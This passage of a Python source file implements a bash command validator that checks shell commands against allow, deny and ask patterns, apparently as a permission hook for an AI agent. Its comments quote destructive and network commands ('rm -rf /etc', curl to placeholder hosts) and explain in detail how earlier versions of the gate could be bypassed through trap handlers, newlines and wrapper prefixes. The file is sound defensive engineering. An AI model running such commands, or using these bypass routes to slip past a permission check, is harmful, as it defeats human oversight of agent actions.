        bash network pseudo-paths (`/dev/tcp/...`, `/dev/udp/...`; see
        NET_REDIRECT_PREFIXES for the security trade-off), and anything
        resolving inside the workspace or /tmp — the same roots that gate `rm`
        and workspace-binary execution.

        When the target fully resolves (no unexpanded construct), we realpath it
        and require containment, exactly like `rm`. When it does NOT resolve
        because of an undefined `$VAR`, a `$(...)`, or a `~user` we cannot expand,
        we fall back to a lenient literal-prefix check (see _literal_prefix...):
        the target is still allowed if its literal leading directory roots inside
        an allowed root and it contains no literal `..`. This keeps frictionless
        the common diagnostic pattern `> /tmp/jit_$i.txt` (literal `/tmp/` root)
        while still prompting on a target with no literal anchor (`> "$LOG"`) or
        one rooted outside (`> /etc/$x`). The residual risk — a variable that
        itself expands to `../` and escapes — is accepted by design.
        """
        if target in SAFE_REDIRECT_DEVICES or target.startswith('/dev/fd/'):
            return True
        if target.startswith(NET_REDIRECT_PREFIXES):
            return True
        resolved = self._resolve_target_path(target)
        if resolved is not None:
            return self._realpath_inside_allowed_roots(resolved)
        return self._literal_prefix_inside_allowed_roots(target)

    def _literal_prefix_inside_allowed_roots(self, target: str) -> bool:
        """
        Lenient fallback for a redirect target carrying an unexpandable construct
        (`$VAR`/`$(...)`/backtick/`~user`): allow it only if the LITERAL leading
        portion — everything before the first such construct — anchors it inside
        an allowed root.

        Rules, all required:
          - The literal prefix must be non-empty: a target that begins with the
            construct (`$LOG`, `$SP/out`) has no anchor and is refused.
          - No literal `..` path segment anywhere in the target (a literal
            traversal could climb out of the anchored root).
          - The literal directory (the prefix's containing dir, or the prefix
            itself when it ends in `/`) must realpath inside the workspace or
            /tmp. A relative literal dir is joined onto the workspace first.
        """
        # Cut at the first shell construct we could not expand.
        prefix = re.split(r'[$`]', target, maxsplit=1)[0]
        if not prefix:
            return False
        # A literal parent-dir segment could traverse out of the anchored root.
        if '..' in prefix.split('/'):
            return False
        # The literal directory the write is anchored under.
        literal_dir = prefix if prefix.endswith('/') else os.path.dirname(prefix)
        try:
            if literal_dir.startswith('/'):
                base = os.path.realpath(literal_dir)
            else:
                base = os.path.realpath(os.path.join(self.workspace_dir, literal_dir))
            return self._realpath_inside_allowed_roots(base)
        except Exception:
            return False

    def _is_workspace_rm(self, cmd: str) -> bool:
        """
        Check if command is 'rm' targeting files inside the workspace.

        Supports:
        - rm file.txt
        - rm -rf dir/
        - rm ./file.txt
        - rm /workspace/file.txt (if inside workspace)

        Args:
            cmd: Normalized command string

        Returns:
            True if all rm targets are inside workspace
        """
        parts = cmd.split()
        if not parts or parts[0] != 'rm':
            return False

        # Extract file arguments (skip flags like -rf, -r, -f, --)
        targets = []
        for part in parts[1:]:
            if part.startswith('-'):
                continue  # Skip flags
            targets.append(part)

        if not targets:
            return False  # No targets specified

        # Check ALL targets are inside workspace
        for target in targets:
            if not self._is_path_inside_allowed_rm_roots(target):
                debug_log(f"rm target {target!r} is outside workspace and /tmp")
                return False

        debug_log(f"rm command {cmd!r} - all targets inside workspace or /tmp")
        return True

    def _basename_variant(self, cmd: str) -> str:
        """
        Reduce an explicit-path command invocation to its bare basename.

        If the first token contains a path separator (e.g. '/bin/ls',
        '/usr/bin/grep', './tool'), return the command with that token replaced
        by its basename ('ls', 'grep', 'tool') so it can match the same
        Bash(<name>:*) patterns as a bare-name invocation. The argument tail is
        preserved verbatim.

        Returns the original command unchanged when the first token has no path
        component (nothing to normalize).

        Examples:
            '/bin/ls -1f /tmp'      -> 'ls -1f /tmp'
            '/usr/bin/grep -n foo'  -> 'grep -n foo'
            '/bin/pwd'              -> 'pwd'
            'ls -la'                -> 'ls -la' (unchanged)
        """
        parts = cmd.split(None, 1)  # first token + untouched remainder
        if not parts:
            return cmd
        first = parts[0]
        if '/' not in first:
            return cmd  # already a bare command name
        base = os.path.basename(first)
        if not base or base == first:
            return cmd
        rest = parts[1] if len(parts) > 1 else ''
        return f"{base} {rest}" if rest else base

    def _alias_variant(self, cmd: str) -> str:
        """
        Rewrite a builtin invoked under one spelling to its canonical spelling,
        so a single allow/deny pattern covers every spelling of the same builtin.

        Currently the only such pair is the `.` builtin and its longhand
        `source`: bash treats `. FILE` and `source FILE` as the identical
        command. Canonicalizing `.` -> `source` means one `Bash(source:*)` rule
        governs both, rather than the policy having to enumerate each spelling
        (and risk the two drifting apart). The argument tail is preserved
        verbatim. This is the same idea as _basename_variant, applied to a
        name alias instead of a path qualification.

        Returns the original command unchanged when the head is not an aliased
        builtin. The head is matched exactly: a bare `.` (the source builtin),
        never `./tool` or `..` (those contain no whitespace boundary and stay a
        path execution handled elsewhere).

        Examples:
            '. ./.env'        -> 'source ./.env'
            '. /etc/profile'  -> 'source /etc/profile'
            'source ./.env'   -> 'source ./.env' (unchanged)
            './tool'          -> './tool'         (unchanged, path execution)
            'git status'      -> 'git status'     (unchanged)
        """
        parts = cmd.split(None, 1)  # first token + untouched remainder
        if not parts or parts[0] != '.':
            return cmd
        rest = parts[1] if len(parts) > 1 else ''
        return f"source {rest}" if rest else 'source'

    def _reduce_to_effective_command(self, cmd: str, noop_reveal: bool = False) -> str:
        """
        Peel leading control-keyword and wrapper prefixes off a sub-command so we
        validate the command that actually runs, not the token that introduces it.

        Without this, the parser leaves prefixes glued to their command (e.g.
        `do curl ...`, `exec rm ...`, `timeout 5 curl ...`), and whitelisting the
        prefix (`Bash(do:*)`, `Bash(exec:*)`) would auto-authorize anything after
        it. Peeling reduces those to `curl ...` / `rm ...` / `curl ...`, which are
        then matched against the allowlist on their own merits.

        Handles nesting (`exec env curl`, `time timeout 5 curl`) by looping. For
        wrappers, skips the wrapper's own flags (`-x`, `--x=y`) and `KEY=VALUE`
        assignments, plus a fixed number of leading positional args (the duration
        for `timeout`, the lockfile for `flock`). Anything it can't confidently
        peel is left in place, so the worst case is a safe defer, never a bypass.

        The `command` builtin is special-cased: `command NAME ...` is an exec
        wrapper and peels to `NAME ...`, but `command -v/-V NAME` is a lookup that
        runs nothing (like `which`/`type`), so it reduces to '' (auto-allow)
        instead of being validated as if NAME were executed.

        Returns the effective command string, or '' when the sub-command runs
        nothing dangerous on its own: a bare prefix (e.g. `do`, `env`) or a
        `command -v` lookup.

        `noop_reveal=True` changes ONE thing: where a no-op builtin or a
        scaffolding keyword would collapse the whole sub-command to '', the
        prefix-peeled remainder is returned instead (`if unset SECRET` ->
        `unset SECRET`, `while read -r line` -> `read -r line`). The caller in
        _check_single_command needs that string to run the deny/ask lookup on the
        SAME text the normal pattern path would see; with the un-reduced
        sub-command, thirteen peelable prefixes hid the head token from the gate
        (review finding MEDIUM 1). It is NOT used to decide what executes — the
        reduction that drives the allow/deny decision still uses the default.

        Examples:
            'do curl http://x'        -> 'curl http://x'
            'exec rm -rf /etc'        -> 'rm -rf /etc'
            'timeout 5 curl http://x' -> 'curl http://x'
            'PORT=3100 pnpm start'    -> 'pnpm start'
            'env FOO=bar node app.js' -> 'node app.js'
            'if grep -q foo file'     -> 'grep -q foo file'
            'for i in 4 5'            -> ''            (loop header, runs nothing)
            'done'                    -> ''            (block terminator)
            ': > "$LOG"'              -> ''            (null command, runs nothing)
            'exit 1'                  -> ''            (terminates, runs nothing)
            'parse() {'               -> ''            (function-def header)
            'command -v chromium'     -> ''            (lookup, runs nothing)
            'command node app.js'     -> 'node app.js' (exec form)
            'git status'              -> 'git status' (unchanged)
        """
        # Peel a leading function-definition header (`name() {`, `function name {`).
        # Defining a function runs nothing; for the inline form `name() { echo hi`
        # the brace-group body is glued to the header by the tokenizer, so we drop
        # the header and validate the body command that followed it. A header with
        # no inline body reduces to a no-op.
        fname, remainder = _strip_function_def_header(cmd)
        if fname is not None:
            if not remainder:
                return ''
            cmd = remainder

        # Bash arithmetic compound command: (( expr )) — only performs arithmetic,
        # runs no shell command. Any nested $() inside were already extracted as
        # CMD_SUBST tokens by the parser and are validated independently, so
        # reducing this to '' cannot hide a dangerous sub-command.
        if cmd.startswith('(('):
            return ''

        tokens = cmd.split()
        guard = 0
        while tokens and guard < 20:
            guard += 1
            head = tokens[0]

            # Loop/case headers and block terminators are scaffolding that runs
            # nothing on its own; the whole sub-command reduces to a no-op.
            if head in SCAFFOLDING_KEYWORDS:
                return ' '.join(tokens) if noop_reveal else ''

            # No-op builtins (`:`, `true`, `false`, `exit`, `return`) run nothing
            # dangerous regardless of their arguments, so the whole sub-command
            # reduces to a no-op. Matched on the bare head (these are builtins,
            # never path-qualified).
            if head in NOOP_BUILTINS:
                return ' '.join(tokens) if noop_reveal else ''

            # `case WORD in` is a header whose WORD is data, not a command (like
            # `for ... in`). Peel `case ... in` so the arm bodies that follow are
            # validated on their own merits. This matters for the FIRST arm: the
            # parser splits a `case` body on `;;`, so the first arm's body comes
            # through glued to the `case ... in` line (`case "$x" in foo) cmd`).
            # Without peeling, that whole segment starts with `case` and would be
            # swallowed by a broad `Bash(case:*)` allow, hiding `cmd`. A command
            # substitution in WORD is extracted by the parser and validated
            # independently, so dropping the header cannot hide it. A `case` with
            # no `in` yet (split across segments) runs nothing -> no-op.
            if head == 'case':
                if 'in' in tokens[1:]:
                    rest = tokens[tokens.index('in', 1) + 1:]
                    # The token right after `in` is always the first arm's
                    # pattern label (`foo)`, `*)`), never a command — drop it so
                    # only the arm body remains. We drop it unconditionally
                    # rather than via the `)`-based rule below because an
                    # empty-body first arm (`case $x in *=0) ;;`) loses its
                    # trailing `)` to _strip_grouping_tokens, leaving a bare
                    # `*=0` the `)`-rule would not recognize.
                    tokens = rest[1:] if rest else rest
                    continue
                return ''

            # Peel a leading case-arm pattern label (`*)`, `foo)`, `*.txt)`).
            # Subsequent arms come through as their own `;;`-split segment with
            # the body glued to the label (`*) echo "$kv"`); the first arm is
            # exposed by the `case ... in` peel above. A token ending in an
            # unbalanced `)` can only be a case pattern in valid bash — `)` is a
            # metacharacter, so no simple command is named that — so stripping
            # the label and validating the arm body cannot authorize anything the
            # user did not write. (A leading `(` is excluded so a subshell
            # fragment like `(cmd` is left for _strip_grouping_tokens;
            # alternation labels like `a|b)` are split on `|` by the parser and
            # remain only partially handled.)
            if (head.endswith(')') and not head.startswith('(')
                    and head.count(')') > head.count('(')):
                tokens = tokens[1:]
                continue

            if head in CONTROL_KEYWORD_PREFIXES:
                tokens = tokens[1:]
                continue

            # Peel leading `KEY=VALUE` environment assignments (e.g.
            # `PORT=3100 pnpm start`) so we validate the command that actually
            # runs, not the assignment. Without this, the env prefix glues to the
            # command and the allow-pattern prefix match (`Bash(pnpm:*)`) fails.
            if BashCommandParser._is_env_prefix(head):
                tokens = tokens[1:]
                continue

            name = os.path.basename(head)

            if name == 'command':
                # Split `command`'s own leading flags from the operand.
                rest = tokens[1:]
                flags = []
                while rest and rest[0].startswith('-') and rest[0] != '--':
                    flags.append(rest[0])
                    rest = rest[1:]
                if rest[:1] == ['--']:
                    rest = rest[1:]
                # `-v`/`-V` (e.g. `command -v X`, `command -pv X`) => lookup mode:
                # nothing runs, so the operand is irrelevant — treat as harmless.
                if any(set(f.lstrip('-')) & COMMAND_LOOKUP_FLAGS for f in flags):
                    return ''
                # Exec mode (`command [-p] NAME ...`): validate the operand.
                tokens = rest
                continue

            if name in WRAPPER_PREFIXES:
                positional = WRAPPER_PREFIXES[name]
                arg_flags = WRAPPER_ARG_FLAGS.get(name, frozenset())
                tokens = tokens[1:]
                # Skip the wrapper's own flags and KEY=VALUE assignments. A flag
                # that takes a SEPARATE argument (e.g. `env -u NAME`) also eats
                # the next token, so it is not mistaken for the command name.
                while tokens and (tokens[0].startswith('-')
                                  or BashCommandParser._is_env_prefix(tokens[0])):
                    flag = tokens[0]
                    tokens = tokens[1:]
                    if (flag in arg_flags and tokens
                            and not tokens[0].startswith('-')):
                        tokens = tokens[1:]
                # Skip the wrapper's fixed leading positional args (e.g. the
                # duration for `timeout`). When a pattern is defined for this
                # wrapper, only skip an operand that matches it — otherwise the
                # operand is the command itself and must be validated, not peeled
                # (`timeout rm ...` / `timeout reboot`, not a duration).
                pos_pattern = WRAPPER_POSITIONAL_PATTERNS.get(name)
                for _ in range(positional):
                    if not tokens or tokens[0].startswith('-'):
                        break
                    if pos_pattern is not None and not pos_pattern.match(tokens[0]):
                        break
                    tokens = tokens[1:]
                continue

            break

        return ' '.join(tokens)

    def _expand_constants(self, cmd: str, const_assignments: dict,
                          cmd_offset: int) -> str:
        """
        Substitute `$VAR`/`${VAR}` references in cmd with constant literals
        assigned earlier in the same compound command.

        Args:
            cmd: Normalized sub-command string.
            const_assignments: name -> list of (offset, literal_or_None) for
                every standalone assignment of that name, sorted by offset.
                A literal of None marks a non-constant (e.g. dynamic) value.
            cmd_offset: Source offset of this sub-command. Only assignments at a
                strictly smaller offset are eligible — bash binds variables in
                source order, so a use cannot see an assignment that follows it.

        Resolution picks the latest eligible assignment for each name (matching
        bash's last-write-wins). If that assignment is non-constant, the
        reference is left untouched (the value is unknown, so the command stays
        on its normal allow/deny path). Unknown names are likewise left as-is.

        This expansion never authorises a `trap` handler. _trap_handler_verdict
        reads the handler out of the PRE-expansion sub-command and refuses any
        handler whose raw spelling carries a `$` or a backtick, so a literal
        substituted here can no longer decide what a deferred handler runs (task
        28 §5, round 5).
        """
        if not const_assignments or '$' not in cmd:
            return cmd

        # A None cmd_offset would raise TypeError below, which main()'s blanket
        # except turns into sys.exit(0) — an ALLOW. Round 4's _resolve_constant
        # had a `cmd_offset is None` arm; inlining it here dropped that. Both
        # callers pass an int today, so this asserts the contract rather than
        # silently failing open if a third caller ever appears.
        assert cmd_offset is not None, "_expand_constants requires a cmd_offset"

        def repl(match):
            name = match.group('braced') or match.group('plain')
            eligible = [lit for off, lit in const_assignments.get(name, [])
                        if off < cmd_offset]
            literal = eligible[-1] if eligible else None
            return literal if literal is not None else match.group(0)

        return _VAR_REF_RE.sub(repl, cmd)

    def _check_single_command(self, cmd: str, function_defs: dict = None,
                              cmd_offset: int = None,
                              _trap_depth: int = 0,
                              raw_command: str = None,
                              unexpanded_cmd: str = None) -> Dict[str, Any]:
        """
        Check if single command matches any pattern

        Args:
            cmd: Normalized command string
            function_defs: Map of function name -> earliest source offset at which
                it is defined in this same compound command. A call to one of
                these executes only its body (validated separately), so it is
                treated as a no-op — but only when the definition lexically
                precedes this call (see cmd_offset).
            cmd_offset: Source offset of this sub-command. A call is treated as a
                no-op only if its function was defined at a strictly smaller
                offset; this prevents a command from being auto-allowed because a
                same-named function is defined *after* it (and so is not yet in
                effect when the command runs).
            raw_command: The command text this sub-command was parsed OUT of,
                before normalization. `cmd` has had its whitespace collapsed
                (`_strip_grouping_tokens` re-joins on single spaces), which
                destroys newlines inside a quoted argument — and a `trap`
                handler's newlines are command separators. Only the trap path
                uses this, to recover the handler's real text; see
                _recover_raw_handler.
            unexpanded_cmd: This same sub-command BEFORE _expand_constants
                rewrote its `$VAR` references (None when no expansion step ran,
                i.e. `cmd` is already the text as written). Only the trap path
                uses it, and it needs it for one thing: a handler must be judged
                on the text the user wrote, not on a literal this validator
                substituted into it. See _trap_handler_verdict.

        Returns:
            Dictionary with:
            - command: The command checked
            - allowed: Boolean - matches an allow pattern
            - denied: Boolean - matches a deny pattern
            - matched_patterns: List of patterns that matched
        """
        matched_allow = []

        # Reduce wrappers/keywords to the command that actually runs, so we never
        # authorize an arbitrary command just because its introducer is allowed.
        effective = self._reduce_to_effective_command(cmd)
        if effective != cmd:
            debug_log(f"Reduced {cmd!r} to effective command {effective!r}")
        if not effective:
            # Nothing dangerous runs: a bare control keyword / wrapper with no
            # command after it (e.g. 'do', 'env'), a loop header / block
            # terminator, a no-op builtin (':', 'exit', ...), a function-def
            # header, or a `command -v/-V` lookup.
            #
            # Ten of the SAFE_BUILTINS tokens (`unset`, `set`, `export`, `read`,
            # `shift`, ...) are ALSO in NOOP_BUILTINS/SCAFFOLDING_KEYWORDS and so
            # reach an auto-allow through this door instead of the shortcut
            # below. The deny/ask lookup has to happen here too, or the fix in
            # §2.1 would only cover `trap`/`source` and an operator's
            # `Bash(unset:*)` deny would still be silently ignored (that is
            # exactly what was measured). The gate is deliberately narrow — only
            # head tokens in SAFE_BUILTINS — so the genuine "runs nothing"
            # returns (function-def headers, `command -v`, `((…))`, `:`/`exit`,
            # `cd`, `declare`, ...) keep their existing behaviour untouched and
            # cannot acquire a new false deny.
            #
            # The lookup runs on the PREFIX-PEELED sub-command, not on `cmd`:
            # `if unset SECRET`, `while read -r line`, `env unset SECRET` and ten
            # more peelable spellings otherwise hide the head token from the gate
            # and the operator's deny is silently ignored (review finding
            # MEDIUM 1). `noop_reveal=True` returns exactly the text the normal
            # pattern path at the bottom of this method would have matched, so
            # the two callers can no longer disagree.
            noop_effective = self._reduce_to_effective_command(cmd, noop_reveal=True)
            if _head_token(noop_effective) in SAFE_BUILTINS:
                override = self._tier_override_result(noop_effective)
                if override is not None:
                    return override
            debug_log(f"Command {cmd!r} runs nothing (bare prefix or lookup) - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'asked': False,
                'matched_allow_patterns': ['control_prefix'],
                'matched_deny_patterns': [],
                'matched_ask_patterns': []
            }
        cmd = effective

        # SAFE_BUILTINS: if the effective head token (the command word after env
        # prefix stripping by _reduce_to_effective_command) is a known-safe shell
        # builtin, skip the ALLOW pattern lookup. The head-token check is precise:
        # we split on whitespace and take the first token, then require it has no
        # '/' (so /bin/trap is not mistaken for the bare builtin trap).
        # This handles:
        #   VAR=x trap ...  → _reduce_to_effective_command peels VAR=x → head=trap ✓
        #   /bin/trap ...   → head='/bin/trap' → '/' present → not matched ✓
        #
        # The shortcut is ALLOW-TIER ONLY (task 28 §2.1): deny and ask are matched
        # first and win, so it can never override the operator's lists.
        _effective_head = _head_token(cmd)
        if _effective_head and '/' not in _effective_head and _effective_head in SAFE_BUILTINS:
            override = self._tier_override_result(cmd)
            if override is not None:
                return override

            # §2.2 — `trap` registers a handler that runs in THIS shell when the
            # signal fires. Validate it as its own sub-command; the verdict for
            # the trap is the handler's verdict.
            if _effective_head == 'trap':
                verdict = self._trap_handler_verdict(cmd, function_defs, cmd_offset,
                                                     _trap_depth, raw_command,
                                                     unexpanded_cmd)
                if verdict is not None:
                    return verdict

            # §2.3 — `source` only shortcuts a literal path operand. A runtime
            # target (`source "$X"`, `source $(mktemp)`) falls through to the
            # normal pattern path, which asks unless a pattern vouches for it.
            #
            # Only the `source` spelling is tested: `.` is not in SAFE_BUILTINS,
            # so a `. ./lib.sh` never reaches this shortcut at all and asks
            # instead of auto-allowing (the earlier `in ('source', '.')` test had
            # a dead arm — review finding LOW). DENY stays symmetric across both
            # spellings through _alias_variant; the allow side is deliberately
            # left asymmetric on the safe side rather than widened here.
            if _effective_head == 'source' and not self._source_operand_is_literal(cmd):
                debug_log(f"Command {cmd!r} sources a non-literal target - "
                          f"skipping the SAFE_BUILTINS shortcut")
            else:
                debug_log(f"Command {cmd!r} head token {_effective_head!r} in SAFE_BUILTINS - auto-allowing")
                return {
                    'command': cmd,
                    'allowed': True,
                    'denied': False,
                    'asked': False,
                    'matched_allow_patterns': ['safe_builtin'],
                    'matched_deny_patterns': [],
                    'matched_ask_patterns': []
                }

        # A call to a function defined EARLIER in this same compound command runs
        # only its (separately validated) body, so it is a no-op here. This also
        # correctly handles a function that shadows a real binary
        # (`rm() { ...; }; rm x`): the function runs, not the binary. The offset
        # guard is what keeps this safe — a same-named function defined *after*
        # this command (or inside the same substitution) is not yet in effect, so
        # the real binary would run and the command must be validated for real.
        if function_defs and cmd_offset is not None:
            head = effective.split()[0] if effective.split() else ''
            def_offset = function_defs.get(head)
            if def_offset is not None and def_offset < cmd_offset:
                debug_log(f"Command {cmd!r} calls local function {head!r} "
                          f"(defined at {def_offset} < {cmd_offset}) - auto-allowing")
                return {
                    'command': cmd,
                    'allowed': True,
                    'denied': False,
                    'asked': False,
                    'matched_allow_patterns': ['local_function'],
                    'matched_deny_patterns': [],
                    'matched_ask_patterns': []
                }

        # First check: workspace binaries are always allowed
        if self._is_workspace_binary(cmd):
            debug_log(f"Command {cmd!r} is a workspace binary - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'asked': False,
                'matched_allow_patterns': ['workspace_binary'],
                'matched_deny_patterns': [],
                'matched_ask_patterns': []
            }

        # Second check: rm for workspace files is allowed
        if self._is_workspace_rm(cmd):
            debug_log(f"Command {cmd!r} is workspace rm - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'asked': False,
                'matched_allow_patterns': ['workspace_rm'],
                'matched_deny_patterns': [],
                'matched_ask_patterns': []
            }

        candidates = self._pattern_candidates(cmd)

        # Deny first (deny takes precedence), then ask (before allow), then allow.
        matched_deny, matched_ask = self._match_deny_and_ask(cmd, candidates)
        for pattern in self.allowed_patterns:
            if any(self._matches_pattern(c, pattern) for c in candidates):
                matched_allow.append(pattern)

        return {
            'command': cmd,
            'allowed': len(matched_allow) > 0,
            'denied': len(matched_deny) > 0,
            'asked': len(matched_ask) > 0,
            'matched_allow_patterns': matched_allow,
            'matched_deny_patterns': matched_deny,
            'matched_ask_patterns': matched_ask
        }

    def _pattern_candidates(self, cmd: str) -> List[str]:
        """
        Build the candidate command strings to match against Bash(...) patterns.

        Path-qualified invocations (e.g. /bin/ls, /usr/bin/grep) are reduced to a
        bare-name variant (ls, grep) so they match the same Bash(<name>:*)
        patterns as the bare command; generated commands vary in this way. Then
        builtin-spelling aliases are canonicalized (currently `.` -> `source`) so
        a single allow/deny pattern covers every spelling of the same builtin.
        The alias pass is applied to each existing candidate so it composes with
        the basename variant.

        One implementation, used by both the deny/ask override that guards the
        auto-allow shortcuts and the normal pattern lookup — two candidate
        builders that disagreed would be a bypass.
        """
        candidates = [cmd]
        normalized = self._basename_variant(cmd)
        if normalized != cmd:
            candidates.append(normalized)
            debug_log(f"Basename-normalized variant: {normalized!r}")

        for c in list(candidates):
            aliased = self._alias_variant(c)
            if aliased != c and aliased not in candidates:
                candidates.append(aliased)
                debug_log(f"Builtin-alias variant: {aliased!r}")
        return candidates

    def _match_deny_and_ask(self, cmd: str, candidates: List[str] = None):
        """Return (matched_deny_patterns, matched_ask_patterns) for a command."""
        if candidates is None:
            candidates = self._pattern_candidates(cmd)
        matched_deny = [p for p in self.denied_patterns
                        if any(self._matches_pattern(c, p) for c in candidates)]
        matched_ask = [p for p in self.ask_patterns
                       if any(self._matches_pattern(c, p) for c in candidates)]
        return matched_deny, matched_ask

    def _tier_override_result(self, cmd: str):
        """
        The deny/ask verdict that no auto-allow shortcut may skip.

        Returns a result dict when `cmd` matches an operator deny or ask pattern,
        else None. Deny outranks ask (brd D2); a deny match never degrades to a
        prompt (epic 22 invariant 1). Callers use it as a gate in front of an
        auto-allow return, so the shortcut only ever skips the ALLOW lookup.
        """
        matched_deny, matched_ask = self._match_deny_and_ask(cmd)
        if matched_deny:
            debug_log(f"Command {cmd!r} matches deny pattern(s) {matched_deny} - "
                      f"auto-allow shortcut refused")
            return {
                'command': cmd,
                'allowed': False,
                'denied': True,
                'asked': bool(matched_ask),
                'matched_allow_patterns': [],
                'matched_deny_patterns': matched_deny,
                'matched_ask_patterns': matched_ask
            }
        if matched_ask:
            debug_log(f"Command {cmd!r} matches ask pattern(s) {matched_ask} - "
                      f"auto-allow shortcut refused")
            return {
                'command': cmd,
                'allowed': False,
                'denied': False,
                'asked': True,
                'matched_allow_patterns': [],
                'matched_deny_patterns': [],
                'matched_ask_patterns': matched_ask
            }
        return None

    def _source_operand_is_literal(self, cmd: str) -> bool:
        """
        True when a `source` invocation's file operand carries no shell
        expansion.

        The name is about expansion, not about resolvability: a glob or a `~`
        (`source *.sh`, `source ~/evil.sh`) contains no `$`/backtick and so
        passes. That is deliberate — the file it names is already on disk, which
        is the same property `source ./x.sh` has and §2.3 already allows — but it
        is NOT the stronger "we know exactly which path" claim (review finding
        LOW).

        `source ./lib.sh` reads a file that is already on disk — nothing is
        generated, so the head-token shortcut is sound. `source "$X"`,
        `source $SCRIPT` and `source $(mktemp)` choose the target at runtime,
        which is a code-execution surface the shortcut cannot vouch for, so those
        fall through to the normal pattern path.

        Note the third form: the parser strips a `$(…)`/backtick token out of the
        normalized sub-command (it is extracted and validated separately), so
        `source $(mktemp)` arrives here as a bare `source` with NO operand. An
        empty operand is therefore treated as non-literal too — there is no path
        left to vouch for.
        """
        parts = cmd.split(None, 1)
        operand = parts[1].strip() if len(parts) > 1 else ''
        if not operand:
            return False
        return '$' not in operand and '`' not in operand

    # `trap -l` lists signal names and `trap -p [SIG...]` prints existing
    # dispositions; neither registers a handler. `--` ends option parsing. A bare
    # `-` is the RESET argument, not a flag.
    _TRAP_QUERY_FLAG_CHARS = set('lp')

    # A shell expansion in the handler's RAW text: what `trap` registers is a
    # template, the text it expands to is computed in an environment this
    # validator does not model, and four review rounds proved that enumerating
    # the ways that environment can change is a list with holes in it. Any
    # handler carrying one of these asks. See _trap_handler_verdict.
    _TRAP_EXPANSION_CHARS = ('$', '`')

    def _trap_handler(self, cmd: str):
        """
        Extract the handler argument of a `trap` invocation.

        Returns (handler, confident):
          - (None, True)  — this invocation registers no handler at all: bare
            `trap`, the query forms `trap -l` / `trap -p [SIG...]`, the reset
            forms `trap - SIG` and `trap SIG` (a lone sigspec resets it), and the
            ignore form `trap '' SIG`.
          - (handler, True) — `handler` is the command string that will run when
            the signal fires, with its quoting removed.
          - (None, False) — the invocation could not be parsed with confidence
            (unbalanced quotes, an unrecognised option). The caller must ask.

        bash's grammar is `trap [-lp] [[ARG] SIGSPEC ...]`; ARG is the handler.
        Quoting is undone with shlex so a single- or double-quoted handler comes
        back as one token — `cmd.split()` would shred it.
        """
        try:
            tokens = shlex.split(cmd)
        except ValueError as e:
            debug_log(f"trap handler extraction failed for {cmd!r}: {e}")
            return None, False

        i = 1  # tokens[0] is `trap`
        n = len(tokens)
        while i < n:
            token = tokens[i]
            if token == '--':
                i += 1
                break
            if token == '-' or not token.startswith('-'):
                break
            flags = token[1:]
            if flags and set(flags) <= self._TRAP_QUERY_FLAG_CHARS:
                # A query/list form: every remaining argument is a sigspec.
                return None, True
            debug_log(f"trap: unrecognised option {token!r} in {cmd!r}")
            return None, False

        if i >= n:
            return None, True  # bare `trap` (or `trap --`): lists dispositions

        handler = tokens[i]
        if handler == '-' or not handler.strip():
            # `trap - SIG` resets to the default disposition; `trap '' SIG`
            # ignores the signal. Neither runs anything.
            return None, True

        # NOTE on bash's lone-sigspec rule. `trap EXIT` — one argument that is a
        # valid signal spec — resets EXIT rather than running a command called
        # `EXIT`, so it too registers nothing. We deliberately do NOT exempt it,
        # because the parser normalizes an UNQUOTED substitution handler down to
        # exactly that shape: `trap $(gen) EXIT` and `trap `gen` EXIT` both
        # arrive here as `trap EXIT` (the substitution is extracted as its own
        # sub-command and the token is dropped). Exempting the shape would leave
        # the original bypass open through a second door — an attacker only needs
        # an allowlisted generator (`echo`, `cat`, `printf`) to hand `trap` an
        # uninspected handler. A genuine reset is spelled `trap - EXIT`, which
        # stays allowed; the bare-sigspec spelling asks.
        return handler, True

    def _raw_token_values(self, raw_command: str) -> List[str]:
        """
        Every token text in `raw_command` exactly as written, recursing into
        command substitutions. Used to look up a normalized token's pre-collapse
        source; see _recover_raw_handler.
        """
        values = []
        try:
            tokens = self.parser._tokenize_with_quotes(raw_command)
        except (ValueError, IndexError, RecursionError) as e:
            debug_log(f"raw re-tokenize of {raw_command!r} failed: {e}")
            return values
        for token_type, token_value, _offset in tokens:
            values.append(token_value)
            if token_type == 'CMD_SUBST' and token_value.strip():
                values.extend(self._raw_token_values(token_value))
        return values

    def _matching_raw_handler_tokens(self, handler: str, raw_command: str):
        """
        The pre-collapse text of every token in `raw_command` whose own
        whitespace-collapse is exactly `handler`.

        `handler` is read out of the sub-command BEFORE constant expansion (see
        _trap_handler_verdict), so this validator has substituted nothing into it
        and the token that is its source matches it literally. No expansion step
        belongs here: a token that would only match once `$X` is resolved is a
        token whose text bash has not fixed yet, and the `$` rule refuses those
        outright instead of guessing a value for them.

        One scan, one matcher: a second, subtly different token matcher is
        exactly how the newline bypass came back in round 3.
        """
        matches = []
        for value in self._raw_token_values(raw_command):
            try:
                flat_words = shlex.split(_collapse_whitespace(value))
                raw_words = shlex.split(value)
            except ValueError:
                continue  # an unbalanced fragment cannot be the handler token
            if len(flat_words) != 1 or len(raw_words) != 1:
                continue  # the handler is a single token; this is not it
            if flat_words[0] == handler:
                matches.append(raw_words[0])
        return matches

    def _recover_raw_handler(self, handler: str, raw_command: str):
        r"""
        Return (handler_text, confident) with the handler's PRE-NORMALIZATION
        text where that text can be identified in `raw_command`.

        Why this exists (review finding BLOCKER 1). The parser keeps a quoted
        handler as one token, but _normalize_command re-joins the sub-command on
        single spaces, so every newline INSIDE the quotes becomes a space:

            trap 'echo start\nrm -rf /etc' EXIT
                -> "trap 'echo start rm -rf /etc' EXIT"

        The handler then parses as ONE command whose first word is `echo`, and
        `rm -rf /etc` is validated as an argument to it — the trap allowed on the
        strength of its first line while bash runs both. Newlines are command
        separators inside a handler exactly as they are anywhere else, so the
        real text has to come back before the handler is parsed.

        The lookup is by content, not by offset: an offset identifies a top-level
        sub-command but not a `trap` nested inside a substitution, where every
        extracted sub-command shares the enclosing offset.

        THE GOVERNING RULE (review round 2): a substitution this method cannot
        PROVE is this handler's source must ask — never allow, and never deny, on
        a guess. Two things follow from it.

        1. A token that lost no whitespace is a candidate too. The old code
           skipped those ("it is not the source"), which let an unrelated
           newline-bearing decoy elsewhere in the command be the ONLY candidate
           and replace a harmless handler with it — a false DENY, which
           hard-blocks with no human rescue (epic 22 H1, review MEDIUM):

               echo 'echo a\ncurl http://e/x' >/dev/null; trap 'echo a curl http://e/x' EXIT

           With the real token also standing as itself, that command now has two
           distinct candidates and asks instead of denying.

